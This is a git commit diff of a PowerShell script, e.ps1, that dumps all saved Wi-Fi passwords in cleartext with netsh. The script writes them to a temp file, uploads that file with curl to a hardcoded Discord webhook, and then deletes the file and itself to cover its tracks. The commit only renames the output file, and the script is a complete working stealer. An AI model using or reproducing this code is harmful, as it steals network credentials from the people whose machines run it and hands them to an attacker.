b65eea23760553f24132d895bf1e54e69a43fcf0
Yetykotlety <146130248+Yetykotlety@users.noreply.github.com>
2024-03-23 21:09:51 +0100

    e.ps1

--- e.ps1
+++ e.ps1
@@ -1,20 +1,18 @@
 #CHANGE URL TO YOUR URL
   $url="https://discord.com/api/webhooks/1133794641678958712/PXc6JyofnzdgkXSYJwOwhPst7TGkGuPV0Eq3jhcj094hPuDo8XgaOUPu0rjNuMWdNW2v" ;
-#Get PC Name+Date+Time
-  $namepc = WIFI
 
 # Get WifiPassword
-echo "" > "$env:temp\EXFILTRED-$namepc.txt";
-(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | out-file "$env:temp\EXFILTRED-$namepc.txt";
+echo "" > "$env:temp\EXFILTRED-WIFI-NETWORKS.txt";
+(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | out-file "$env:temp\EXFILTRED-WIFI-NETWORKS.txt";
 
 #UPLOAD
 cd $env:temp
 # Upload wifi password
-  curl.exe -F "file2=@EXFILTRED-$namepc.txt" $url;
+  curl.exe -F "file2=@EXFILTRED-WIFI-NETWORKS.txt" $url;
 
 #Delete all file
 # Delete wifi password
-  Remove-Item "EXFILTRED-$namepc.txt" -Force -Recurse;
+  Remove-Item "EXFILTRED-WIFI-NETWORKS.txt" -Force -Recurse;
 # Delete this script
   Remove-Item  $env:temp\e.ps1 -Force -Recurse;
 
